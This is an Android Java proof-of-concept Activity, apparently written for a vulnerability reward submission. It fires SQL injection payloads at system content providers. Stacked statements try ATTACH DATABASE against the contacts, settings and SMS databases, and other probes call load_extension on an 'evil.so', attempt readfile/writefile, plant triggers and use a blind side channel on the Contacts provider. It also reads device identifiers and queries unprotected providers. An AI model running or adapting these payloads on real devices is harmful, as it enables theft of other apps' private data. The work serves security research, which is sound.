package com.vrp.poc;

import android.app.Activity;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class SqliteEscalationActivity extends Activity {
    private static final String TAG = "SqliteEscalation";
    private TextView logView;
    private static final String CAL_URI = "content://com.android.calendar/events";
    private static final String CONTACTS_URI = "content://com.android.contacts/contacts";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(6);
        logView.setText("SQLite Escalation PoC\nUID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runTests() {
        testAttachDatabase();
        testSqliteFunctions();
        testTriggerCreation();
        testContactsWritePath();
        testDialerProviders();
        testSettingsWrite();
        testZeroPermProviders();
        log("\n=== ALL ESCALATION TESTS COMPLETE ===");
    }

    private void testAttachDatabase() {
        log("=== TEST 1: ATTACH DATABASE via CalendarProvider ===");

        // Try ATTACH in projection
        String[] attachPaths = {
            "/data/data/com.android.providers.contacts/databases/contacts2.db",
            "/data/data/com.android.providers.settings/databases/settings.db",
            "/data/data/com.android.providers.telephony/databases/mmssms.db",
            "/data/system/users/0/settings_secure.xml"
        };

        for (String dbPath : attachPaths) {
            try {
                // Method 1: ATTACH in projection
                Cursor c = getContentResolver().query(
                    Uri.parse(CAL_URI),
                    new String[]{"*) FROM Events; ATTACH DATABASE '" + dbPath + "' AS stolen--"},
                    null, null, null
                );
                if (c != null) {
                    log("  ATTACH projection (" + dbPath + "): rows=" + c.getCount());
                    c.close();
                } else {
                    log("  ATTACH projection (" + dbPath + "): null cursor");
                }
            } catch (Exception e) {
                log("  ATTACH projection blocked: " + e.getClass().getSimpleName() + ": " + shortenMsg(e.getMessage()));
            }
        }

        // Try ATTACH in selection
        log("\n--- ATTACH via selection ---");
        try {
            ContentValues cv = new ContentValues();
            cv.put("title", "test");
            int rows = getContentResolver().update(
                Uri.parse(CAL_URI), cv,
                "_id=-99999; ATTACH DATABASE '/data/data/com.android.providers.contacts/databases/contacts2.db' AS stolen--",
                null
            );
            log("  ATTACH selection UPDATE: " + rows + " rows");
        } catch (Exception e) {
            log("  ATTACH selection blocked: " + shortenMsg(e.getMessage()));
        }

        // Try via semicolon-separated statements in selection
        log("\n--- Semicolon stacking in selection ---");
        try {
            Cursor c = getContentResolver().query(
                Uri.parse(CAL_URI),
                new String[]{"_id"},
                "1=1; SELECT * FROM sqlite_master--",
                null, null
            );
            if (c != null) {
                log("  Semicolon stacking: " + c.getCount() + " rows (SUCCEEDED)");
                c.close();
            }
        } catch (Exception e) {
            log("  Semicolon stacking blocked: " + shortenMsg(e.getMessage()));
        }
    }

    private void testSqliteFunctions() {
        log("\n=== TEST 2: SQLite dangerous functions via CalendarProvider ===");

        // Test load_extension
        try {
            Cursor c = getContentResolver().query(
                Uri.parse(CAL_URI),
                new String[]{"load_extension('/data/local/tmp/evil.so') AS ext"},
                null, null, null
            );
            if (c != null) {
                log("  load_extension: " + c.getCount() + " rows (CRITICAL!)");
                c.close();
            }
        } catch (Exception e) {
            log("  load_extension: " + shortenMsg(e.getMessage()));
        }

        // Test readfile (if available)
        try {
            Cursor c = getContentResolver().query(
                Uri.parse(CAL_URI),
                new String[]{"readfile('/etc/hosts') AS data"},
                null, null, null
            );
            if (c != null) {
                log("  readfile: " + c.getCount() + " rows");
                if (c.moveToFirst()) log("  data: " + c.getString(0));
                c.close();
            }
        } catch (Exception e) {
            log("  readfile: " + shortenMsg(e.getMessage()));
        }

        // Test writefile
        try {
            Cursor c = getContentResolver().query(
                Uri.parse(CAL_URI),
                new String[]{"writefile('/data/local/tmp/sqli_test.txt','pwned') AS w"},
                null, null, null
            );
            if (c != null) {
                log("  writefile: " + c.getCount() + " rows (CRITICAL!)");
                c.close();
            }
        } catch (Exception e) {
            log("  writefile: " + shortenMsg(e.getMessage()));
        }

        // Test fts3_tokenizer (potential for arbitrary code execution)
        try {
            Cursor c = getContentResolver().query(
                Uri.parse(CAL_URI),
                new String[]{"fts3_tokenizer('simple') AS tok"},
                null, null, null
            );
            if (c != null) {
                log("  fts3_tokenizer: " + c.getCount() + " rows");
                if (c.moveToFirst()) {
                    byte[] blob = c.getBlob(0);
                    log("  tokenizer ptr: " + bytesToHex(blob));
                }
                c.close();
            }
        } catch (Exception e) {
            log("  fts3_tokenizer: " + shortenMsg(e.getMessage()));
        }

        // Test sqlite_compileoption_used
        try {
            Cursor c = getContentResolver().query(
                Uri.parse(CAL_URI),
                new String[]{
                    "sqlite_compileoption_used('ENABLE_LOAD_EXTENSION') AS ext",
                    "sqlite_compileoption_used('ENABLE_FTS3_TOKENIZER') AS fts",
                    "sqlite_compileoption_used('ENABLE_ATTACH') AS attach"
                },
                null, null, null
            );
            if (c != null && c.moveToFirst()) {
                log("  ENABLE_LOAD_EXTENSION: " + c.getString(0));
                log("  ENABLE_FTS3_TOKENIZER: " + c.getString(1));
                log("  ENABLE_ATTACH: " + c.getString(2));
                c.close();
            }
        } catch (Exception e) {
            log("  compileoption: " + shortenMsg(e.getMessage()));
        }

        // Test sqlite_version
        try {
            Cursor c = getContentResolver().query(
                Uri.parse(CAL_URI),
                new String[]{"sqlite_version() AS ver"},
                null, null, null
            );
            if (c != null && c.moveToFirst()) {
                log("  SQLite version: " + c.getString(0));
                c.close();
            }
        } catch (Exception e) {
            log("  sqlite_version: " + shortenMsg(e.getMessage()));
        }
    }

    private void testTriggerCreation() {
        log("\n=== TEST 3: CREATE TRIGGER via CalendarProvider ===");

        // Try creating a trigger that fires on future INSERT
        try {
            Cursor c = getContentResolver().query(
                Uri.parse(CAL_URI),
                new String[]{"*) FROM Events; CREATE TRIGGER pwn AFTER INSERT ON Events BEGIN SELECT 1; END--"},
                null, null, null
            );
            if (c != null) {
                log("  CREATE TRIGGER projection: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("  CREATE TRIGGER: " + shortenMsg(e.getMessage()));
        }

        // Try via UPDATE selection
        try {
            ContentValues cv = new ContentValues();
            cv.put("title", "test");
            int rows = getContentResolver().update(
                Uri.parse(CAL_URI), cv,
                "_id=-99999; CREATE TRIGGER pwn2 AFTER INSERT ON Events BEGIN INSERT INTO sqlite_master VALUES(1); END--",
                null
            );
            log("  CREATE TRIGGER via UPDATE: " + rows);
        } catch (Exception e) {
            log("  CREATE TRIGGER UPDATE: " + shortenMsg(e.getMessage()));
        }
    }

    private void testContactsWritePath() {
        log("\n=== TEST 4: Contacts write-path injection ===");

        // We know Contacts blocks projection injection but selection works
        // Test if UPDATE/DELETE also accept selection injection
        try {
            ContentValues cv = new ContentValues();
            cv.put("starred", 0);
            int rows = getContentResolver().update(
                Uri.parse("content://com.android.contacts/contacts"),
                cv,
                "_id=-99999 AND (SELECT count(*) FROM sqlite_master)>0",
                null
            );
            log("  Contacts UPDATE selection injection: " + rows + " rows (ACCEPTED)");
        } catch (Exception e) {
            log("  Contacts UPDATE: " + shortenMsg(e.getMessage()));
        }

        // Test Contacts DELETE with injection
        try {
            int rows = getContentResolver().delete(
                Uri.parse("content://com.android.contacts/raw_contacts"),
                "_id=-99999 AND (SELECT count(*) FROM sqlite_master WHERE type='table')>0",
                null
            );
            log("  Contacts DELETE selection injection: " + rows + " rows (ACCEPTED)");
        } catch (Exception e) {
            log("  Contacts DELETE: " + shortenMsg(e.getMessage()));
        }

        // Test Contacts write-path blind exfiltration via UPDATE
        log("\n--- Contacts blind exfil via UPDATE side-channel ---");
        try {
            // First find a contact to test with
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.contacts/contacts"),
                new String[]{"_id", "display_name"},
                null, null, "_id ASC LIMIT 1"
            );
            if (c != null && c.moveToFirst()) {
                long testId = c.getLong(0);
                String origName = c.getString(1);
                c.close();
                log("  Test contact: _id=" + testId + " name=" + origName);

                // Try conditional UPDATE based on internal table data
                ContentValues cv2 = new ContentValues();
                cv2.put("starred", 1);
                int rows = getContentResolver().update(
                    Uri.parse("content://com.android.contacts/contacts"),
                    cv2,
                    "_id=" + testId + " AND (SELECT count(*) FROM accounts)>0",
                    null
                );
                log("  Conditional UPDATE (accounts>0): " + rows + " rows modified");

                if (rows > 0) {
                    log("  *** CONTACTS WRITE-PATH INJECTION CONFIRMED ***");
                    log("  *** UPDATE accepted subquery against internal table ***");
                    // Restore
                    ContentValues restore = new ContentValues();
                    restore.put("starred", 0);
                    getContentResolver().update(
                        Uri.parse("content://com.android.contacts/contacts"),
                        restore, "_id=" + testId, null
                    );
                }
            } else {
                log("  No contacts found for test");
                if (c != null) c.close();
            }
        } catch (Exception e) {
            log("  Contacts write exfil: " + shortenMsg(e.getMessage()));
        }
    }

    private void testDialerProviders() {
        log("\n=== TEST 5: Google Dialer custom providers ===");

        String[] dialerUris = {
            "content://com.google.android.dialer.annotatedcalllog",
            "content://com.google.android.dialer.preferredsimfallback",
            "content://com.android.dialer.debug.dump.dumptools",
            "content://com.android.dialer.persistentlog",
            "content://com.google.android.dialer.cacheprovider"
        };

        for (String uri : dialerUris) {
            try {
                Cursor c = getContentResolver().query(
                    Uri.parse(uri), null, null, null, null
                );
                if (c != null) {
                    log("  " + uri.substring(uri.lastIndexOf('/') + 1) + ": " + c.getCount() + " rows, " + c.getColumnCount() + " cols");
                    if (c.getColumnCount() > 0) {
                        StringBuilder cols = new StringBuilder();
                        for (String col : c.getColumnNames()) cols.append(col).append(", ");
                        log("    Columns: " + cols);
                    }
                    c.close();
                } else {
                    log("  " + uri + ": null cursor");
                }
            } catch (Exception e) {
                log("  " + uri.substring(uri.lastIndexOf('/') + 1) + ": " + e.getClass().getSimpleName());
            }
        }
    }

    private void testSettingsWrite() {
        log("\n=== TEST 6: Settings provider write test ===");

        // Try to write to Settings.System
        try {
            boolean success = android.provider.Settings.System.putString(
                getContentResolver(), "vrp_test_key", "vrp_test_value"
            );
            log("  Settings.System write: " + (success ? "SUCCESS" : "FAILED"));
            if (success) {
                String val = android.provider.Settings.System.getString(
                    getContentResolver(), "vrp_test_key"
                );
                log("  Read back: " + val);
            }
        } catch (Exception e) {
            log("  Settings.System: " + shortenMsg(e.getMessage()));
        }

        // Read sensitive settings
        try {
            String btAddr = android.provider.Settings.Secure.getString(
                getContentResolver(), "bluetooth_address"
            );
            log("  bluetooth_address: " + btAddr);
        } catch (Exception e) {
            log("  bluetooth_address: " + shortenMsg(e.getMessage()));
        }

        try {
            String androidId = android.provider.Settings.Secure.getString(
                getContentResolver(), "android_id"
            );
            log("  android_id: " + androidId);
        } catch (Exception e) {
            log("  android_id: " + shortenMsg(e.getMessage()));
        }
    }

    private void testZeroPermProviders() {
        log("\n=== TEST 7: Zero-permission provider access ===");

        // Contacts profile (sensitive!)
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.contacts/profile"),
                null, null, null, null
            );
            if (c != null) {
                log("  Contacts profile: " + c.getCount() + " rows");
                if (c.moveToFirst()) {
                    for (int i = 0; i < Math.min(c.getColumnCount(), 5); i++) {
                        log("    " + c.getColumnName(i) + " = " + c.getString(i));
                    }
                }
                c.close();
            } else {
                log("  Contacts profile: null cursor");
            }
        } catch (Exception e) {
            log("  Contacts profile: " + shortenMsg(e.getMessage()));
        }

        // Google Contacts YourInfo provider
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.google.android.contacts.yourinfo"),
                null, null, null, null
            );
            if (c != null) {
                log("  YourInfo: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("  YourInfo: " + shortenMsg(e.getMessage()));
        }

        // SDN provider (service dialing numbers)
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.google.android.contacts.sdn.provider"),
                null, null, null, null
            );
            if (c != null) {
                log("  SDN: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("  SDN: " + shortenMsg(e.getMessage()));
        }

        // Wellbeing SliceProvider
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.google.android.apps.wellbeing/"),
                null, null, null, null
            );
            if (c != null) {
                log("  Wellbeing: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("  Wellbeing: " + shortenMsg(e.getMessage()));
        }

        // Keep SliceProvider
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.google.android.keep/"),
                null, null, null, null
            );
            if (c != null) {
                log("  Keep: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("  Keep: " + shortenMsg(e.getMessage()));
        }
    }

    private String shortenMsg(String msg) {
        if (msg == null) return "null";
        return msg.length() > 150 ? msg.substring(0, 150) + "..." : msg;
    }

    private String bytesToHex(byte[] bytes) {
        if (bytes == null) return "null";
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) sb.append(String.format("%02x", b));
        return sb.toString();
    }
}
